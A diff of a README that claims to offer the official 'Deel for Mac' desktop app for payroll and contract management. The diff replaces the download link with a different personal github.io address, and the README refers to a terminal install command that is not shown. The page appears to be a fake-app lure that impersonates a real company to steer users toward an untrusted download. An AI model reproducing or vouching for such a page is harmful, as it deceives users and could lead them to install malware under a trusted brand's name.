@@ -4,7 +4,7 @@
 Deel for Mac brings the power of global payroll, compliance, and contract management directly to your macOS device.  
 Follow the instructions below to install the official desktop app.
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-007AFF?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/deel)
+[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-007AFF?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/deel)
 
 If the download button doesn’t work, you can install Deel manually via the terminal using the command shown below.
 
